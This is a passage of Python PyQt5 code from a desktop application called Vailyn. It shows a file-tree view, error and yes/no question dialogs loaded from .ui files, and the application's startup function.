                    tree_append("/".join(plist[1::]), child)

        create_tree(self.foundfiles, root)
        self.treeView.expandAll()
        self.show()

    def show_error(self, message):
        self.errorDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Error.ui", self.errorDialog)
        self.errorDialog.errorMessage.setText(message)
        self.errorDialog.errorOkButton.clicked.connect(
            self.errorDialog.close,
        )
        self.errorDialog.exec_()

    def show_question(self, message):
        def intern():
            self.answer = True
            self.questionDialog.close()

        self.answer = False
        self.questionDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Question.ui", self.questionDialog)
        self.questionDialog.question.setText(message)
        self.questionDialog.noButton.clicked.connect(
            self.questionDialog.close,
        )
        self.questionDialog.yesButton.clicked.connect(intern)
        self.questionDialog.exec_()
        return self.answer


app = None


def app_main():
    global app
    app = QtWidgets.QApplication(sys.argv)
    window = VailynApp()
    app.setWindowIcon(QtGui.QIcon("core/qt5/icons/Vailyn.png"))
    app.exec_()
